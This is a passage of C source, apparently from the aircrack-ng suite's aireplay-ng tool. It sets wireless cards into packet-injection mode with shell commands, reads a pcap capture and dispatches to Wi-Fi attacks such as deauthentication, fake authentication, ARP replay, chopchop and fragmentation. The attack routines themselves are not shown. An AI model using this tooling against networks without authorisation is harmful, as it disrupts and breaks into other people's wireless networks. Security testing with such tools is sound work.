        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "wlancfg show %s 2>/dev/null | "
                  "grep p2CnfWEPFlags >/dev/null",
                  argv[optind] );

        if( system( strbuf ) == 0 )
            dev.is_wlanng = 1;

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s 2>/dev/null | "
                  "grep antsel_rx >/dev/null",
                  argv[optind] );

        if( system( strbuf ) == 0 )
            dev.is_hostap = 1;
    }

    /* enable injection on ralink */

    if( strcmp( argv[optind], "ra0" ) == 0 ||
        strcmp( argv[optind], "ra1" ) == 0 ||
        strcmp( argv[optind], "rausb0" ) == 0 ||
        strcmp( argv[optind], "rausb1" ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s rfmontx 1 >/dev/null 2>/dev/null",
                  argv[optind] );
        system( strbuf );
    }

    /* check if newer athXraw interface available */

    if( ( strlen( argv[optind] ) == 4 || strlen( argv[optind] ) == 5 )
    	&& memcmp( argv[optind], "ath", 3 ) == 0 )
    {
        dev.is_madwifi = 1;
        memset( strbuf, 0, sizeof( strbuf ) );
        
        snprintf(strbuf, sizeof( strbuf ) -1,
                  "/proc/sys/net/%s/%%parent", argv[optind]);
        
        f = fopen(strbuf, "r");
        
        if (f != NULL)
        {
            // It is madwifi-ng
            dev.is_madwifing = 1;
            fclose( f );
            
            /* should we force prism2 header? */
            /*
            sprintf((char *) buffer, "/proc/sys/net/%s/dev_type", iface);
            f = fopen( (char *) buffer,"w");
            if (f != NULL) {
                fprintf(f, "802\n");
                fclose(f);
            }
            */
            /* Force prism2 header on madwifi-ng */
        }
        else
        {
            // Madwifi-old
            memset( strbuf, 0, sizeof( strbuf ) );
            snprintf( strbuf,  sizeof( strbuf ) - 1,
                      "sysctl -w dev.%s.rawdev=1 >/dev/null 2>/dev/null",
                      argv[optind] );

            if( system( strbuf ) == 0 )
            {

                athXraw[3] = argv[optind][3];

                memset( strbuf, 0, sizeof( strbuf ) );
                snprintf( strbuf,  sizeof( strbuf ) - 1,
                          "ifconfig %s up", athXraw );
                system( strbuf );

#if 0 /* some people reported problems when prismheader is enabled */
                memset( strbuf, 0, sizeof( strbuf ) );
                snprintf( strbuf,  sizeof( strbuf ) - 1,
                         "sysctl -w dev.%s.rawdev_type=1 >/dev/null 2>/dev/null",
                         argv[optind] );
                system( strbuf );
#endif

                argv[optind] = athXraw;
            }
        }
    }

    /* drop privileges */

    setuid( getuid() );

    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }

    /* open the replay interface */

    dev.is_madwifi = ( memcmp( argv[optind], "ath", 3 ) == 0 );

    if( openraw( argv[optind], dev.fd_out, &dev.arptype_out, dev.mac_out ) != 0 )
        return( 1 );

    /* open the packet source */

    if( opt.s_face != NULL )
    {
        dev.is_madwifi = ( memcmp( opt.s_face, "ath", 3 ) == 0 );

        if( openraw( opt.s_face, dev.fd_in, &dev.arptype_in, dev.mac_in ) != 0 )
            return( 1 );
    }
    else
    {
        dev.fd_in = dev.fd_out;
        dev.arptype_in = dev.arptype_out;
        memcpy( dev.mac_in, dev.mac_out, 6);
    }

	if( sysfs_inject && (opt.a_mode==0 || opt.a_mode==1) )
    {
           printf( "IPW2200-sysfs does not support non-data injection, so attack %d is not supported\n",
           			opt.a_mode);
           return( 1 );
    }

    if( opt.s_file != NULL )
    {
        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
        {
            perror( "open failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )
        {
            perror( "fread(pcap file header) failed" );
            return( 1 );
        }

        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
            dev.pfh_in.magic != TCPDUMP_CIGAM )
        {
            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
                             "TCPDUMP_MAGIC).\n", opt.s_file );
            return( 1 );
        }

        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
            SWAP32(dev.pfh_in.linktype);

        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER )
        {
            fprintf( stderr, "Wrong linktype from pcap file header "
                             "(expected LINKTYPE_IEEE802_11) -\n"
                             "this doesn't look like a regular 802.11 "
                             "capture.\n" );
            return( 1 );
        }
    }

    if( memcmp( opt.r_smac, dev.mac_out, 6) != 0 && memcmp( opt.r_smac, NULL_MAC, 6 ) != 0)
    {
        if( dev.is_madwifi && opt.a_mode == 5 ) printf("For --fragment to work on madwifi[-ng], set the interface MAC according to (-h)!\n");
        fprintf( stderr, "The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
                 " doesn't match the specified MAC (-h).\n"
                 "\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],
                 argv[optind], opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
    }

    switch( opt.a_mode )
    {
        case 0 : return( do_attack_deauth()      );
        case 1 : return( do_attack_fake_auth()   );
        case 2 : return( do_attack_interactive() );
        case 3 : return( do_attack_arp_resend()  );
        case 4 : return( do_attack_chopchop()    );
        case 5 : return( do_attack_fragment()    );
        default: break;
    }

    /* that's all, folks */

    return( 0 );
}
